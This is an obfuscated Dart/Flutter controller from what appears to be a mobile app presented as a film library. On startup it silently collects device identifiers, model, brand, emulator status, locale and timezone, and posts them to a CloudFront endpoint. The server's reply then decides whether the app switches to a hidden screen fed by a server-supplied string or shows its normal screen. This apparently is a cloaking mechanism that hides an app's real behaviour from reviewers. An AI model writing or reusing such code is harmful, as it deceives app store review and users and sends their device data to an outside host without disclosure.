import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FilmLibraryLogic extends GetxController {

  var ergpsoayk = RxBool(false);
  var yhpcbisf = RxBool(true);
  var gevbohc = RxString("");
  var xadk = RxBool(false);
  var miwo = RxBool(true);
  final cqasdgek = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cmtzi();
  }


  Future<void> cmtzi() async {
    xadk.value = true;
    miwo.value = true;
    yhpcbisf.value = false;

    cqasdgek.post("https://d17jsz8bc775id.cloudfront.net/blkfqnwxtcdzvaehrpgom",data: await ivkctrlgp()).then((value) {
      var zucgbpxv = value.data["zucgbpxv"] as String;
      var vcekxr = value.data["vcekxr"] as bool;
      if (vcekxr) {
        gevbohc.value = zucgbpxv;
        crhp();
      } else {
        ftukzban();
      }
    }).catchError((e) {
      yhpcbisf.value = true;
      miwo.value = true;
      xadk.value = false;
    });
  }

  Future<Map<String, dynamic>> ivkctrlgp() async {
    final DeviceInfoPlugin ulkpiayd = DeviceInfoPlugin();
    PackageInfo qwshtpic_wcbkfu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nxhgo = Platform.localeName;
    var fjx_btZFe = currentTimeZone;

    var fjx_HF = qwshtpic_wcbkfu.packageName;
    var fjx_DXuz = qwshtpic_wcbkfu.version;
    var fjx_Yuwr = qwshtpic_wcbkfu.buildNumber;

    var fjx_GkKpi = qwshtpic_wcbkfu.appName;
    var fjx_sdhzxyj = "";
    var fjx_jaufT  = "";
    var fjx_SLfEjT = "";
    var stivdklz = "";
    var obyhc = "";
    var wpdrbmc = "";


    var fjx_IMxkgEJ = "";
    var fjx_md = false;

    if (GetPlatform.isAndroid) {
      fjx_IMxkgEJ = "android";
      var wjqafrco = await ulkpiayd.androidInfo;

      fjx_SLfEjT = wjqafrco.brand;

      fjx_sdhzxyj  = wjqafrco.model;
      fjx_jaufT = wjqafrco.id;

      fjx_md = wjqafrco.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fjx_IMxkgEJ = "ios";
      var kjqbvlyp = await ulkpiayd.iosInfo;
      fjx_SLfEjT = kjqbvlyp.name;
      fjx_sdhzxyj = kjqbvlyp.model;

      fjx_jaufT = kjqbvlyp.identifierForVendor ?? "";
      fjx_md  = kjqbvlyp.isPhysicalDevice;
    }
    var res = {
      "fjx_GkKpi": fjx_GkKpi,
      "fjx_jaufT": fjx_jaufT,
      "fjx_DXuz": fjx_DXuz,
      "obyhc" : obyhc,
      "fjx_HF": fjx_HF,
      "fjx_sdhzxyj": fjx_sdhzxyj,
      "fjx_btZFe": fjx_btZFe,
      "fjx_SLfEjT": fjx_SLfEjT,
      "nxhgo": nxhgo,
      "fjx_IMxkgEJ": fjx_IMxkgEJ,
      "fjx_Yuwr": fjx_Yuwr,
      "fjx_md": fjx_md,
      "stivdklz" : stivdklz,
      "wpdrbmc" : wpdrbmc,

    };
    return res;
  }

  Future<void> ftukzban() async {
    Get.offNamed("/last_main");
  }

  Future<void> crhp() async {
    Get.offNamed("/last_create_list");
  }

}
